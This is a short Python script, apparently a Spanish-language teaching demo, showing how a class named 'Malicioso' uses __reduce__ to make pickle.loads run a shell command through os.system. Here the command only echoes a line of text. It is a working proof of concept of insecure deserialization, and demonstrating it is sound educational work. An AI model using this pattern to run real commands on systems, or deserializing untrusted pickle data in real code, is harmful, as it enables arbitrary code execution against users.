import os
import pickle

class Malicioso :
    def __reduce__(self):
        return (os.system, ("echo 'Hola, TEXTO QUE SE EJECUTA EN EL SISTEMA'",))
    
carga = pickle.dumps(Malicioso())

#print(carga) 

pickle.loads(carga)



          